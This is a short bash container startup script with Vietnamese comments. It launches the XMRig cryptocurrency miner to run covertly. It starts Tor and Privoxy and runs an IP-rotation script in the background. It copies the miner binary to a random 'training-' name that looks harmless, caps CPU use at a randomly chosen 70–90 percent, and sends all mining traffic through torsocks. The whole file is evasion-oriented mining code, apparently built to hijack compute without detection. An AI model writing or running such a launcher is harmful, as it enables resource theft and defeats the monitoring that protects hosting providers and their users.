#!/bin/bash

# Khởi động dịch vụ Tor và Privoxy
service tor start
service privoxy start

# Khởi động script đổi IP ngẫu nhiên trong nền
/root/change_ip.sh &

# Nếu chưa có file sao lưu của xmrig, tạo bản sao lưu
if [ ! -f /root/work/xmrig-${VERSION}/xmrig_backup ]; then
    cp /root/work/xmrig-${VERSION}/xmrig /root/work/xmrig-${VERSION}/xmrig_backup
fi

# Lấy tổng số lõi CPU
TOTAL_CORES=$(nproc)

# Chọn một tỷ lệ phần trăm ngẫu nhiên từ 70 đến 90
RANDOM_PERCENT=$(shuf -i 70-90 -n 1)

# Tính số threads dựa trên tổng số lõi và tỷ lệ phần trăm đã chọn
CPU_HINT=$(echo "($TOTAL_CORES * $RANDOM_PERCENT) / 100" | bc)

# Kiểm tra xem xmrig_name.txt có tồn tại không, nếu không thì tạo tên mới và khởi động XMRig
if [ ! -f /root/xmrig_name.txt ]; then
    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
    cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/$RANDOM_NAME
    chmod +x /root/work/$RANDOM_NAME
    echo $RANDOM_NAME > /root/xmrig_name.txt
    echo "Chạy XMRig với tên mới $RANDOM_NAME..."
    torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$CPU_HINT
else
    # Nếu đã có tên, khởi động lại XMRig
    RANDOM_NAME=$(cat /root/xmrig_name.txt)
    echo "Chạy lại XMRig với tên $RANDOM_NAME..."
    torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$CPU_HINT
fi

# Giữ container chạy
tail -f /dev/null
